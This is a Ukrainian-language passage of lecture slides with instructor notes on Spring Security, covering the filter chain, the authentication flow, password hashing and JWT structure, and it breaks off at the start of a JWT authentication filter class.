**Аналогія — аеропорт:**
Уявіть прохід через аеропорт. DelegatingFilterProxy — це вхідні двері. FilterChainProxy — це інформаційне табло, яке направляє вас до потрібного терміналу. SecurityFilterChain — це конкретний термінал (internal/international). А фільтри — це послідовні перевірки: паспортний контроль (AuthN), перевірка візи (AuthZ), сканування багажу (CSRF), металодетектор (Injection protection).

## Слайд 2.3 — SecurityFilterChain: Конфігурація

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // Вимкнути CSRF для REST API (stateless)
            .csrf(csrf -> csrf.disable())

            // Налаштування авторизації запитів
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/users/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            )

            // Stateless сесія (для JWT)
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )

            // HTTP Basic (для простоти)
            .httpBasic(Customizer.withDefaults());

        return http.build();
    }
}
```

**Порядок правил має значення!** Перше правило, що збігається — виграє.

### Пояснення для викладача:

Розберіть кожний рядок конфігурації:

**`@Configuration`** — позначає клас як джерело Spring-бінів.

**`@EnableWebSecurity`** — вмикає веб-безпеку Spring Security та імпортує конфігурацію. У Spring Boot 3.x ця анотація часто не потрібна (автоконфігурація додає її), але явно вказувати — хороша практика для читабельності.

**`SecurityFilterChain filterChain(HttpSecurity http)`** — метод, який створює і конфігурує ланцюг фільтрів. `HttpSecurity` — це builder, через який ви налаштовуєте поведінку.

**`.csrf(csrf -> csrf.disable())`** — вимикає CSRF-захист. Для REST API з JWT це правильно, бо CSRF-атака експлуатує автоматичну відправку cookies браузером, а JWT передається через заголовок Authorization — браузер його автоматично не відправляє. Але для form-based додатків CSRF вимикати НЕ можна!

**`.authorizeHttpRequests(...)`** — конфігурація авторизації. Порядок правил критичний:
- `"/api/public/**"` → `permitAll()` — ці URL доступні БЕЗ автентифікації (реєстрація, логін, публічні дані)
- `"/api/admin/**"` → `hasRole("ADMIN")` — тільки для адмінів
- `"/api/users/**"` → `hasAnyRole("USER", "ADMIN")` — для USER або ADMIN
- `anyRequest().authenticated()` — все інше — потрібна автентифікація (будь-яка роль)

**ВАЖЛИВО про порядок:** Spring перевіряє правила зверху вниз і застосовує ПЕРШЕ збіг. Якщо ви поставите `anyRequest().authenticated()` ПЕРШИМ — воно "з'їсть" усі наступні правила, і `permitAll()` для публічних URL ніколи не спрацює.

**`.sessionManagement(... STATELESS)`** — говорить Spring Security НЕ створювати HttpSession. Кожен запит автентифікується заново (через JWT). Це важливо для REST API — інакше Spring створюватиме сесії і витрачатиме пам'ять.

**`.httpBasic(Customizer.withDefaults())`** — вмикає HTTP Basic автентифікацію (заголовок `Authorization: Basic ...`). Тут використовується для простоти прикладу. У production зазвичай замість цього буде JWT-фільтр або OAuth2.

## Слайд 2.4 — Ключові фільтри та їх порядок

```
Порядок виконання фільтрів (спрощено):

1. CorsFilter              — CORS headers
2. CsrfFilter              — CSRF protection
3. LogoutFilter             — обробка /logout
4. UsernamePasswordAuthenticationFilter  — form login
5. BearerTokenAuthenticationFilter       — JWT/OAuth2
6. RequestCacheAwareFilter  — кеш запитів (redirect після логіну)
7. SecurityContextHolderFilter — зберігає SecurityContext
8. AuthorizationFilter      — перевірка прав доступу ←── найважливіший
9. ExceptionTranslationFilter — обробка помилок безпеки
```

> Кожний фільтр відповідає за одну задачу. Якщо фільтр не може обробити запит — передає далі по ланцюгу.

### Пояснення для викладача:

Не потрібно заучувати всі фільтри — потрібно зрозуміти принцип. Кожен фільтр — це окремий "працівник на конвеєрі", який відповідає за одну задачу.

**CorsFilter** — обробляє Cross-Origin Resource Sharing. Коли ваш фронтенд на `localhost:3000` робить запит до API на `localhost:8080` — браузер блокує це (same-origin policy). CorsFilter додає заголовки (`Access-Control-Allow-Origin`), які дозволяють кросс-доменні запити.

**CsrfFilter** — перевіряє CSRF-токен у формах (для stateful додатків). Для REST API з JWT зазвичай вимкнений.

**LogoutFilter** — перехоплює запити на `/logout` і виконує очищення: інвалідує сесію, видаляє cookies, очищає SecurityContext.

**UsernamePasswordAuthenticationFilter** — перехоплює POST-запити на `/login` з параметрами `username` і `password`. Це для form-based логіну (не для REST API).

**BearerTokenAuthenticationFilter** — перехоплює заголовок `Authorization: Bearer <token>`, витягує JWT, валідує його. Це ваш основний фільтр для REST API.

**AuthorizationFilter** — останній "вратар" перед контролером. Перевіряє правила з `authorizeHttpRequests()`: чи має поточний автентифікований користувач доступ до конкретного URL. Якщо ні — повертає 403.

**ExceptionTranslationFilter** — перехоплює винятки від AuthorizationFilter та інших. `AccessDeniedException` → 403, `AuthenticationException` → 401 (або redirect на /login).

Важливо: коли ви пишете свій кастомний фільтр (наприклад, JwtAuthenticationFilter) — ви додаєте його в конкретне місце ланцюга через `.addFilterBefore()` або `.addFilterAfter()`. Наприклад, JWT-фільтр зазвичай ставлять ПЕРЕД `UsernamePasswordAuthenticationFilter`.

## Слайд 2.5 — Authentication Flow (Як працює автентифікація)

```
┌──────────────┐     UsernamePasswordAuthenticationToken
│  HTTP Request │ ──────────────────────────────────────────►
│ (login+pass)  │        (ще НЕ автентифікований)
└──────────────┘
                                    │
                                    ▼
                        ┌───────────────────────┐
                        │  AuthenticationManager │  ← делегує роботу
                        │    (ProviderManager)   │
                        └───────────┬───────────┘
                                    │
                        ┌───────────▼───────────┐
                        │ AuthenticationProvider │  ← DaoAuthenticationProvider
                        └───────────┬───────────┘
                                    │
                    ┌───────────────┼───────────────┐
                    ▼                               ▼
          ┌─────────────────┐            ┌──────────────────┐
          │ UserDetailsService│            │  PasswordEncoder  │
          │  (завантаження   │            │  (перевірка       │
          │   користувача)   │            │   паролю)         │
          └─────────────────┘            └──────────────────┘
                    │                               │
                    ▼                               ▼
          User знайдений?                Пароль збігається?
          ✓                              ✓
                    │
                    ▼
        SecurityContextHolder.getContext()
            .setAuthentication(authToken)  ← тепер автентифікований!
```

### Пояснення для викладача:

Це серце Spring Security. Пройдіться по кожному кроку:

**Крок 1 — Створення токена:** Коли приходить запит з username/password, фільтр створює об'єкт `UsernamePasswordAuthenticationToken`. Зверніть увагу: на цьому етапі токен ще НЕ автентифікований (прапорець `authenticated = false`). Цей об'єкт — просто контейнер для credentials.

**Крок 2 — AuthenticationManager:** Це інтерфейс з одним методом — `authenticate(Authentication)`. Дефолтна реалізація — `ProviderManager`. Він НЕ автентифікує сам — він делегує роботу списку `AuthenticationProvider`-ів. Навіщо така абстракція? Бо у вас може бути кілька способів автентифікації: через БД, через LDAP, через OAuth — кожен зі своїм Provider.

**Крок 3 — AuthenticationProvider:** `DaoAuthenticationProvider` — стандартний провайдер для username/password автентифікації через базу даних. "Dao" — від "Data Access Object". Він робить дві речі: 1) завантажує користувача через `UserDetailsService`, 2) перевіряє пароль через `PasswordEncoder`.

**Крок 4a — UserDetailsService:** Викликає метод `loadUserByUsername(username)`. Ваша реалізація йде в БД, знаходить користувача, повертає `UserDetails`-об'єкт (або кидає `UsernameNotFoundException` якщо не знайдено). Spring Security НЕ знає як зберігаються ваші користувачі — може в PostgreSQL, може в MongoDB, може в LDAP — йому байдуже. Він працює тільки з інтерфейсом `UserDetailsService`.

**Крок 4b — PasswordEncoder:** Порівнює пароль з запиту з захешованим паролем з БД. `BCryptPasswordEncoder.matches("rawPassword", "$2a$10$...")` — повертає true або false. Зверніть увагу: BCrypt порівнює НЕ два хеші — він бере сіль з збереженого хешу, хешує введений пароль з тією ж сіллю, і порівнює результат.

**Крок 5 — SecurityContextHolder:** Якщо все ОК — створюється НОВИЙ `UsernamePasswordAuthenticationToken` з `authenticated = true` і зберігається в `SecurityContextHolder`. Це ThreadLocal-сховище — доступне у будь-якому місці коду поточного потоку (контролер, сервіс, репозиторій).

**Якщо автентифікація провалюється:** кидається `AuthenticationException` (або `BadCredentialsException`), `ExceptionTranslationFilter` перехоплює її і повертає 401.

## Слайд 2.6 — UserDetails та UserDetailsService

**UserDetails** — інтерфейс, що представляє користувача у Spring Security:

```java
public interface UserDetails extends Serializable {
    Collection<? extends GrantedAuthority> getAuthorities(); // ролі
    String getPassword();
    String getUsername();
    boolean isAccountNonExpired();
    boolean isAccountNonLocked();
    boolean isCredentialsNonExpired();
    boolean isEnabled();
}
```

**UserDetailsService** — завантажує користувача з бази:

```java
@Service
public class CustomUserDetailsService implements UserDetailsService {

    private final UserRepository userRepository;

    @Override
    public UserDetails loadUserByUsername(String username)
            throws UsernameNotFoundException {

        User user = userRepository.findByUsername(username)
            .orElseThrow(() ->
                new UsernameNotFoundException("User not found: " + username));

        return org.springframework.security.core.userdetails.User.builder()
            .username(user.getUsername())
            .password(user.getPassword())     // вже захешований!
            .roles(user.getRoles().toArray(new String[0]))
            .build();
    }
}
```

### Пояснення для викладача:

**UserDetails** — це контракт між вашим додатком і Spring Security. Spring Security не знає і не хоче знати вашу доменну модель (клас `User` у вашому проекті). Він працює з інтерфейсом `UserDetails`.

Розберіть кожен метод інтерфейсу:
- `getAuthorities()` — повертає колекцію ролей/дозволів. `GrantedAuthority` — це теж інтерфейс з одним методом `getAuthority()`, який повертає рядок (наприклад, "ROLE_ADMIN"). Spring Security порівнює ці рядки при перевірці `hasRole()`, `hasAuthority()`.
- `getPassword()` — захешований пароль. Він потрібен `PasswordEncoder`-у для порівняння.
- `getUsername()` — ідентифікатор для логіну. Не обов'язково ім'я — може бути email.
- `isAccountNonExpired()` — чи не протерміновний акаунт (наприклад, тріальний період закінчився)
- `isAccountNonLocked()` — чи не заблокований акаунт (наприклад, після 5 невдалих спроб логіну)
- `isCredentialsNonExpired()` — чи не протермінований пароль (деякі системи вимагають зміну паролю кожні 90 днів)
- `isEnabled()` — чи активний акаунт (наприклад, email ще не підтверджений)

Якщо будь-який з цих методів повертає `false` — автентифікація провалюється з відповідним повідомленням, навіть якщо пароль правильний.

**UserDetailsService** — інтерфейс з єдиним методом `loadUserByUsername(String username)`. Це точка, де Spring Security "з'єднується" з вашою базою даних. Ваша задача: 1) знайти користувача в БД, 2) перетворити його на `UserDetails`, 3) або кинути `UsernameNotFoundException`.

**Важливий момент з прикладу:** зверніть увагу що `user.getPassword()` повертає ВЖЕ захешований пароль (який зберігається в БД). Хешування відбувається при реєстрації (`passwordEncoder.encode(rawPassword)`), а при автентифікації Spring Security сам порівнює через `PasswordEncoder.matches()`.

Ви можете створити свій клас, що реалізує `UserDetails`, замість використання builder-а — це зручніше коли потрібні додаткові поля (id, email, avatar):

```java
public class CustomUserDetails implements UserDetails {
    private final Long id;
    private final String username;
    private final String password;
    private final List<GrantedAuthority> authorities;
    // ... реалізація методів
}
```

## Слайд 2.7 — PasswordEncoder

**Золоте правило:** паролі НІКОЛИ не зберігаються у відкритому вигляді!

```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();  // стандарт індустрії
}
```

**Як працює BCrypt:**
```
Вхід:  "myPassword123"
Вихід: "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
         │   │  │                                              │
         │   │  └── Salt (22 символи, унікальний для кожного)  │
         │   └── Cost factor (10 = 2^10 ітерацій)              │
         └── Алгоритм (2a = BCrypt)                     Hash ──┘
```

**Порівняння алгоритмів:**

| Encoder | Безпечний? | Використання |
|---------|-----------|--------------|
| `NoOpPasswordEncoder` | НІ | Тільки для тестів |
| `BCryptPasswordEncoder` | ТАК | Стандарт для більшості проектів |
| `Argon2PasswordEncoder` | ТАК | Найновіший, переможець конкурсу |
| `SCryptPasswordEncoder` | ТАК | Альтернатива BCrypt |

```java
// Реєстрація користувача
public User registerUser(String username, String rawPassword) {
    User user = new User();
    user.setUsername(username);
    user.setPassword(passwordEncoder.encode(rawPassword)); // хешуємо!
    return userRepository.save(user);
}
```

### Пояснення для викладача:

**Чому не можна зберігати паролі у відкритому вигляді?** Бо бази даних зламують. Регулярно. Якщо зловмисник отримує доступ до бази — він бачить всі паролі. А люди використовують однакові паролі на різних сайтах → зловмисник отримує доступ до email, банку тощо.

**Чому не MD5/SHA1?** Ці хеш-функції надто швидкі. Сучасна відеокарта може обчислити мільярди MD5-хешів на секунду. Зловмисник просто перебирає всі можливі паролі (rainbow table attack), хешує кожен і порівнює з хешем з бази.

**Чому BCrypt безпечний?**
1. **Salt (сіль)** — кожен пароль хешується з унікальною випадковою сіллю. Два користувачі з однаковим паролем "password" матимуть РІЗНІ хеші. Це робить rainbow tables марними — для кожної солі потрібна окрема таблиця.
2. **Cost factor (фактор складності)** — BCrypt навмисно ПОВІЛЬНИЙ. Число 10 означає 2^10 = 1024 ітерації. Один хеш обчислюється ~100мс. Для одного користувача при логіні це непомітно, але для brute-force мільйона паролів — це ~100 000 секунд = ~28 годин. Можна збільшити до 12, 14 — і кожне збільшення на 1 подвоює час.

**Розбір формату BCrypt-хешу:**
```
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
```
- `$2a$` — версія алгоритму BCrypt
- `10$` — cost factor (2^10 ітерацій)
- `N9qo8uLOickgx2ZMRZoMye` — salt (22 символи Base64)
- `IjZAgcfl7p92ldGxad68LJZdL17lhWy` — hash (31 символ Base64)

Salt зберігається РАЗОМ з хешем. Тому при порівнянні BCrypt витягує salt зі збереженого хешу, хешує введений пароль з тією ж salt і порівнює результати. Не потрібно зберігати salt окремо.

**Argon2** — переможець конкурсу Password Hashing Competition (2015). Використовує не тільки CPU, але й пам'ять (memory-hard), що ускладнює brute-force на GPU. Якщо починаєте новий проект — можна одразу використовувати Argon2.

## Слайд 2.8 — SecurityContext: Доступ до поточного користувача

```java
// Спосіб 1: через SecurityContextHolder (де завгодно)
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
String username = auth.getName();
Collection<? extends GrantedAuthority> roles = auth.getAuthorities();

// Спосіб 2: через параметр контролера (зручніше)
@GetMapping("/api/profile")
public UserProfile getProfile(@AuthenticationPrincipal UserDetails userDetails) {
    return userService.getProfile(userDetails.getUsername());
}

// Спосіб 3: через Authentication об'єкт
@GetMapping("/api/profile")
public UserProfile getProfile(Authentication authentication) {
    String username = authentication.getName();
    return userService.getProfile(username);
}
```

### Пояснення для викладача:

Після успішної автентифікації інформація про поточного користувача зберігається в `SecurityContextHolder`. Це ThreadLocal-сховище — кожен потік (тобто кожен HTTP-запит) має свій власний SecurityContext.

**Спосіб 1 — SecurityContextHolder:** Працює з будь-якого місця: контролер, сервіс, утиліта. Мінус — створює жорсткий зв'язок з Spring Security. Важко тестувати.

**Спосіб 2 — @AuthenticationPrincipal:** Рекомендований спосіб для контролерів. Spring автоматично витягує principal з SecurityContext і передає як параметр. Чистіше, легше тестувати (просто передаєте mock UserDetails).

**Спосіб 3 — Authentication:** Корисно коли потрібен доступ не тільки до principal, а й до authorities, details, credentials.

**Рекомендація:** у контролерах використовуйте `@AuthenticationPrincipal`, у сервісах — передавайте username/userId як параметр методу (а не витягуйте з SecurityContextHolder всередині сервісу). Це робить сервіс чистішим і легшим для тестування.

## Слайд 2.9 — Повний приклад: In-Memory Authentication

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth
                .requestMatchers(HttpMethod.GET, "/api/products/**").permitAll()
                .requestMatchers(HttpMethod.POST, "/api/products/**").hasRole("ADMIN")
                .requestMatchers("/api/users/me").authenticated()
                .anyRequest().authenticated()
            )
            .httpBasic(Customizer.withDefaults());

        return http.build();
    }

    @Bean
    public UserDetailsService userDetailsService(PasswordEncoder encoder) {
        UserDetails admin = User.builder()
            .username("admin")
            .password(encoder.encode("admin123"))
            .roles("ADMIN")
            .build();

        UserDetails user = User.builder()
            .username("user")
            .password(encoder.encode("user123"))
            .roles("USER")
            .build();

        return new InMemoryUserDetailsService(admin, user);
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

### Пояснення для викладача:

Це повний робочий приклад, який студенти можуть скопіювати і запустити. Розберіть його як цілісну картину:

**In-Memory UserDetailsService** — зберігає користувачів у пам'яті (HashMap). Підходить для прототипів, тестів, демо. У production замість `InMemoryUserDetailsService` ви напишете `CustomUserDetailsService`, який ходить у БД.

**Правила авторизації:**
- `GET /api/products/**` — `permitAll()` — каталог товарів відкритий для всіх (навіть неавторизованих). Логічно — люди хочуть бачити товари до реєстрації.
- `POST /api/products/**` — `hasRole("ADMIN")` — додавати товари може тільки адмін. Зверніть увагу: ми розрізняємо по HTTP-методу! GET дозволений всім, POST — тільки адміну.
- `/api/users/me` — `authenticated()` — будь-який автентифікований користувач може бачити свій профіль. Неважливо яка роль — головне що він залогінений.
- `anyRequest().authenticated()` — все інше потребує автентифікації. Це "catch-all" правило — сітка безпеки.

**Паролі:** навіть для InMemory-конфігурації паролі ХЕШУЮТЬСЯ через `encoder.encode()`. Це хороша практика і демонструє правильний підхід.

Запропонуйте студентам подумати: "Що буде, якщо неавторизований користувач зробить POST /api/products?" → Відповідь: 401 Unauthorized (спочатку спрацює AuthN — він не автентифікований). "А якщо авторизований USER зробить POST /api/products?" → 403 Forbidden (AuthN пройшла, але AuthZ — ні, бо він USER, а не ADMIN).

### Пояснення для викладача:

Тестування безпеки — надзвичайно важливе і часто ігнорується. Покажіть що тестувати безпеку у Spring Boot дуже просто.

**`@AutoConfigureMockMvc`** — створює MockMvc, який дозволяє виконувати HTTP-запити без запуску реального сервера. Працює швидко — ідеально для тестів.

**`@WithMockUser`** — магічна анотація від Spring Security Test. Вона створює "фейкового" автентифікованого користувача і кладе його в SecurityContext ПЕРЕД виконанням тесту. Вам не потрібно проходити реальну автентифікацію — просто вказуєте username і ролі.

**Чотири тестових сценарії — це мінімальний набір для безпеки:**
1. Публічний endpoint БЕЗ автентифікації → 200 OK (переконуємося що не заблокували публічне)
2. Захищений endpoint БЕЗ автентифікації → 401 (переконуємося що справді захищено)
3. Захищений endpoint З правильною роллю → 200 OK (переконуємося що доступ є)
4. Захищений endpoint З неправильною роллю → 403 (переконуємося що ролі працюють)

Важливо пояснити різницю між 401 і 403:
- **401 Unauthorized** — "Я не знаю хто ти" (відсутня або невалідна автентифікація)
- **403 Forbidden** — "Я знаю хто ти, але тобі не можна" (автентифікований, але немає прав)

## Слайд 3.1 — Що таке JWT?

**JWT (JSON Web Token)** — компактний, URL-safe формат передачі claims між сторонами.

```
Проблема Session-based підходу у мікросервісах:

┌────────┐     Session?     ┌──────────┐
│ Service │ ───────────────► │ Service  │  Де зберігати сесію?
│    A    │                  │    B     │  Як синхронізувати?
└────────┘                  └──────────┘

Рішення — Token-based (JWT):

┌────────┐  JWT (self-contained) ┌──────────┐
│ Service │ ────────────────────► │ Service  │  Токен містить всю
│    A    │                      │    B     │  інформацію всередині!
└────────┘                      └──────────┘
```

**Ключова перевага:** сервер НЕ зберігає стан — токен є самодостатнім.

### Пояснення для викладача:

JWT (вимовляється "джот") — це стандарт (RFC 7519), який визначає компактний формат для безпечної передачі інформації між сторонами у вигляді JSON-об'єкта. Ця інформація може бути перевірена, бо вона підписана цифровим підписом.

**Проблема, яку вирішує JWT:** Поверніться до слайду 1.3 про Session vs Token. У мікросервісній архітектурі з Session-based підходом виникає проблема: User Service створив сесію, але Order Service нічого про неї не знає. Треба або мати спільне session store (Redis), або "клеїти" запити до одного сервера (sticky sessions). І те, і інше додає складність.

JWT вирішує це елегантно: токен містить ВСЮ інформацію про користувача всередині себе. Будь-який сервіс може прочитати токен, перевірити підпис і дізнатися хто зробив запит — без звернення до іншого сервісу або спільної бази. Це як паспорт: вам не потрібно телефонувати в країну видачі щоб перевірити його — достатньо перевірити водяні знаки, голограму, підпис.

**Claims** — це "заяви" (факти) про користувача, що містяться в токені. Наприклад: "я — user123", "мої ролі — ADMIN", "токен дійсний до 18:00". Будь-який сервіс, який довіряє ключу підпису, може прочитати ці claims і прийняти рішення про авторизацію.

## Слайд 3.2 — Структура JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJyb2xlcyI6WyJBRE1JTiJdLCJpYXQiOjE3MTY2MDAwMDB9.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

├──────── Header ────────┤├──────────────── Payload ─────────────────┤├─── Signature ───┤
```

**Header** (алгоритм + тип):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** (дані / claims):
```json
{
  "sub": "1234567890",      // subject — ID користувача
  "name": "John",           // custom claim
  "roles": ["ADMIN"],       // custom claim
  "iat": 1716600000,        // issued at
  "exp": 1716603600         // expiration (1 година)
}
```

**Signature** (підпис):
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

> JWT НЕ шифрує дані — він лише ПІДПИСУЄ їх. Будь-хто може прочитати payload!

### Пояснення для викладача:

JWT складається з трьох частин, розділених крапками. Кожна частина — це Base64URL-закодований JSON (крім signature).

**Header (Заголовок):**
- `alg` — алгоритм підпису. `HS256` = HMAC з SHA-256 (симетричний — один ключ для підпису і перевірки). `RS256` = RSA з SHA-256 (асиметричний — приватний ключ для підпису, публічний для перевірки). У мікросервісах часто використовують RS256: Auth Server підписує приватним ключем, а всі інші сервіси перевіряють публічним (його не потрібно тримати в секреті).
- `typ` — тип токена, завжди "JWT"

**Payload (Корисне навантаження):**
Тут містяться claims — "заяви" про користувача. Це звичайний JSON. Ви можете додати будь-які поля. Стандартні (registered) claims мають зарезервовані назви (`sub`, `exp`, `iat`), але ви можете додавати свої (`roles`, `email`, `tenant_id`).

**ВАЖЛИВО:** Payload НЕ зашифрований! Base64 — це НЕ шифрування, а кодування. Будь-хто може декодувати payload і прочитати вміст. Покажіть на jwt.io — вставте токен і побачите весь payload. Тому НІКОЛИ не кладіть у JWT: паролі, номери кредитних карток, персональні дані (GDPR), секретну бізнес-інформацію. JWT гарантує ЦІЛІСНІСТЬ (ніхто не змінив дані), але НЕ конфіденційність (будь-хто може прочитати).

**Signature (Підпис):**
Підпис створюється так: беремо закодований header і payload, з'єднуємо крапкою, і хешуємо з секретним ключем. Якщо хтось змінить БУДЬ-ЯКИЙ символ у header або payload — підпис не співпаде, і сервер відхилить токен.

Це як восковий друк на конверті: ви можете прочитати лист (payload відкритий), але якщо хтось змінив текст — друк буде зламаний, і ви зрозумієте що лист підроблений.

**Рекомендація:** відкрийте jwt.io і покажіть студентам в реальному часі: вставте JWT, покажіть як він розбирається на частини, спробуйте змінити payload — підпис стане невалідним (позначиться червоним).

## Слайд 3.3 — Типи Claims

| Тип | Приклад | Опис |
|-----|---------|------|
| **Registered** | `sub`, `exp`, `iat`, `iss` | Стандартні (RFC 7519) |
| **Public** | `email`, `name` | Загальновідомі (IANA registry) |
| **Private** | `roles`, `tenant_id` | Кастомні для вашого додатку |

**Основні Registered Claims:**

```
sub (Subject)    — ідентифікатор користувача ("user123")
exp (Expiration) — час закінчення дії (Unix timestamp)
iat (Issued At)  — час створення токена
iss (Issuer)     — хто видав токен ("https://auth.myapp.com")
aud (Audience)   — для кого токен ("my-api")
jti (JWT ID)     — унікальний ідентифікатор токена
```

### Пояснення для викладача:

**Registered claims** — визначені в стандарті RFC 7519. Вони не обов'язкові, але рекомендовані:
- `sub` (Subject) — ідентифікатор "про кого" цей токен. Зазвичай це userId або username. Важливо: sub повинен бути унікальним в межах issuer.
- `exp` (Expiration) — Unix timestamp (кількість секунд з 1 січня 1970). Після цього часу токен вважається невалідним. Сервер перевіряє: `if (now > exp) → reject`. Без `exp` токен ніколи не закінчується — це небезпечно!
- `iat` (Issued At) — коли токен був створений. Корисно для аудиту та перевірки "свіжості" токена.
- `iss` (Issuer) — хто видав токен. Сервер перевіряє: "Я довіряю тільки токенам від auth.myapp.com — якщо issuer інший, відхиляю".
- `aud` (Audience) — для кого призначений токен. Product Service перевіряє: "Цей токен для мене (aud=product-service)? Якщо для іншого сервісу — відхиляю".
- `jti` (JWT ID) — унікальний ідентифікатор токена. Використовується для запобігання replay attacks (повторне використання перехопленого токена).

**Private claims** — ваші кастомні дані. Найчастіше додають: `roles` (ролі користувача), `email`, `tenant_id` (для мультитенантних додатків), `permissions` (конкретні дозволи). Пам'ятайте: чим більше claims — тим більший токен, і він передається з КОЖНИМ запитом у HTTP-заголовку. Тримайте payload мінімальним.

## Слайд 3.4 — JWT Flow: Як це працює

```
┌────────┐                              ┌────────┐
│ Client │                              │ Server │
└───┬────┘                              └───┬────┘
    │                                       │
    │  1. POST /api/auth/login              │
    │     { "username", "password" }        │
    │ ─────────────────────────────────────►│
    │                                       │ 2. Перевірка credentials
    │                                       │    Генерація JWT
    │  3. { "token": "eyJhbG..." }          │
    │ ◄─────────────────────────────────────│
    │                                       │
    │  4. GET /api/users/me                 │
    │     Authorization: Bearer eyJhbG...   │
    │ ─────────────────────────────────────►│
    │                                       │ 5. Валідація JWT
    │                                       │    - Перевірка підпису
    │                                       │    - Перевірка exp
    │                                       │    - Витяг claims
    │  6. { "id": 1, "name": "John" }      │
    │ ◄─────────────────────────────────────│
```

### Пояснення для викладача:

Пройдіться по кожному кроку діаграми:

**Крок 1:** Клієнт (фронтенд, мобільний додаток, Postman) надсилає POST-запит з username і password. Це єдиний момент, коли пароль передається через мережу — тому ОБОВ'ЯЗКОВО через HTTPS.

**Крок 2:** Сервер отримує credentials, перевіряє їх через AuthenticationManager → UserDetailsService → PasswordEncoder (весь flow зі слайду 2.5). Якщо ОК — генерує JWT з потрібними claims (sub, roles, exp).

**Крок 3:** Сервер повертає JWT у response body (НЕ в cookie). Клієнт зберігає токен. Де зберігати — важливе питання: localStorage (вразливий до XSS), sessionStorage (губиться при закритті вкладки), HttpOnly cookie (безпечніше, але складніше з CORS), in-memory (найбезпечніше, але губиться при refresh сторінки).

**Крок 4:** При кожному наступному запиті клієнт додає заголовок `Authorization: Bearer eyJhbG...`. Слово "Bearer" — це тип схеми автентифікації (визначений в RFC 6750). Воно означає "той, хто пред'являє цей токен, має право на доступ".

**Крок 5:** Сервер валідує JWT:
- Перевіряє підпис — чи не був токен модифікований
- Перевіряє exp — чи не протермінований
- Перевіряє iss — чи довіряємо ми цьому видавцю
- Витягує claims — username, roles
- Створює Authentication об'єкт і кладе в SecurityContext

**Крок 6:** Якщо все ОК — запит проходить далі до контролера, який обробляє запит і повертає дані.

**Що відбувається при помилках:**
- Токен відсутній → 401 (фільтр пропускає запит далі, але AuthorizationFilter відхиляє)
- Токен невалідний (підпис не збігається, протермінований) → 401
- Токен валідний, але немає прав → 403

## Слайд 3.5 — Реалізація: JwtService

```java
@Service
public class JwtService {

    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.expiration}")
    private long expiration; // мілісекунди

    // Генерація токена
    public String generateToken(UserDetails userDetails) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("roles", userDetails.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .toList());

        return Jwts.builder()
            .setClaims(claims)
            .setSubject(userDetails.getUsername())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
            .compact();
        }

    // Валідація токена
    public boolean isTokenValid(String token, UserDetails userDetails) {
        final String username = extractUsername(token);
        return username.equals(userDetails.getUsername())
            && !isTokenExpired(token);
    }

    // Витяг username
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }

    private <T> T extractClaim(String token, Function<Claims, T> resolver) {
        Claims claims = Jwts.parserBuilder()
            .setSigningKey(getSigningKey())
            .build()
            .parseClaimsJws(token)
            .getBody();
        return resolver.apply(claims);
    }

    private SecretKey getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secret);
        return Keys.hmacShaKeyFor(keyBytes);
    }

    private boolean isTokenExpired(String token) {
        Date expiration = extractClaim(token, Claims::getExpiration);
        return expiration.before(new Date());
    }
}
```

### Пояснення для викладача:

Це центральний клас для роботи з JWT. Використовує бібліотеку `io.jsonwebtoken:jjwt` (JJWT). Розберіть кожен метод:

**`generateToken()`** — створює JWT:
1. Формуємо Map з кастомними claims (тут — ролі). Зверніть увагу: ми беремо authorities з UserDetails і перетворюємо на список рядків (["ROLE_ADMIN", "ROLE_USER"]).
2. Використовуємо builder-патерн: встановлюємо claims, subject (username), час створення, час закінчення, підписуємо ключем.
3. `.compact()` — збирає все в один рядок (header.payload.signature).

**`isTokenValid()`** — перевіряє валідність: username з токена збігається з username з БД, і токен не протермінований. Навіщо перевіряти username? Бо токен міг бути створений для іншого користувача. Якщо хтось підмінив username в БД — перевірка не пройде.

**`extractClaim()`** — Generic-метод для витягування будь-якого claim. Використовує Function як параметр — це дозволяє передати будь-який getter: `Claims::getSubject`, `Claims::getExpiration`, або кастомний `claims -> claims.get("roles")`.

**`getSigningKey()`** — перетворює Base64-закодований секрет у `SecretKey`. Секрет зберігається в `application.yml` (а краще — в environment variable). Мінімальна довжина для HS256 — 256 біт (32 байти). Згенерувати: `openssl rand -base64 32`.

**`parseClaimsJws()`** — ця функція робить ТРИ речі одночасно: 1) декодує header і payload, 2) перевіряє підпис, 3) перевіряє exp. Якщо щось не так — кидає виняток (`ExpiredJwtException`, `SignatureException`, `MalformedJwtException`).

## Слайд 3.6 — Реалізація: JwtAuthenticationFilter

```java
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtService jwtService;
    private final UserDetailsService userDetailsService;

    @Override
